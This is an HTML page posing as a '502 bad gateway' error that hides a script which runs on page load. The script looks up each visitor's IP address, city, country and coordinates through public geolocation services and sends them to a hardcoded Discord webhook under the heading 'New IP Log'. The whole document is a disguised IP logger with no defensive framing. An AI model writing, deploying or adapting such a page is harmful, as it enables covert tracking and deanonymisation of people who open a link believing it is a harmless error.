<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <style>
        body { font-family: Arial, sans-serif;  margin-top: 50px; }
        h1 { color: black; }
    </style>
</head>
<body>
    <h1>502 bad gateaway</h1>
    <script>
        // Fetch geolocation data including IP
        fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const city = data.city || 'Unknown';
                const countryCode = data.country || '';
                const [lat, lon] = (data.loc || '').split(',') || ['Unknown', 'Unknown'];
                
                if (countryCode === 'Unknown' || !countryCode) {
                    // Send without country name
                    sendPayload(ip, city, 'Unknown', lat, lon);
                    return;
                }
                
                // Fetch country name
                fetch(`https://restcountries.com/v3.1/alpha/${countryCode}?fields=name`)
                    .then(response => response.json())
                    .then(geo => {
                        const country = geo[0]?.name?.common || 'Unknown';
                        sendPayload(ip, city, country, lat, lon);
                    })
                    .catch(err => {
                        console.error('Country name fetch error:', err);
                        sendPayload(ip, city, 'Unknown', lat, lon);
                    });
            })
            .catch(err => {
                console.error('IPinfo fetch error:', err);
                // Fallback to ipify for IP only
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        sendPayload(data.ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown');
                    })
                    .catch(() => {
                        // Even fallback fails, just don't send
                    });
            });

        function sendPayload(ip, city, country, lat, lon) {
            const payload = {
                content: `**New IP Log**\n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
            };
            
            fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error('Webhook send error:', err));
        }
    </script>
</body>
</html>
